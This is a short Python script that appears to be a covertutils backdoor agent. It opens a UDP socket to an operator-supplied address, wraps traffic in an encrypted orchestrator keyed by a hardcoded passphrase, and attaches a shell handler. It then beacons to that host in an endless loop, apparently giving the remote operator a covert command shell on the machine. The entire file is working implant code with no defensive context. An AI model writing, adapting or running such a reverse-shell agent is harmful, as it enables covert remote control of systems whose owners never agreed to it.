#!/usr/bin/env python
from covertutils.handlers.impl import SimpleShellHandler
from covertutils.orchestration import SimpleOrchestrator

import sys
import socket
from time import sleep

from hashlib import sha512

passphrase = "Pa55phra531"
addr = sys.argv[1], int(sys.argv[2])
delay = int( sys.argv[3] )

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def recv () :		# Create wrappers for networking
    return s.recvfrom( 50 )[0]

def send( raw ) :		# Create wrappers for networking
	return s.sendto( raw, addr )

orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True, cycling_algorithm = sha512 )
handler = SimpleShellHandler( recv, send, orch )	# Create the Handler Daemon Thread

while True :
    send( 'X' )
    sleep( delay )
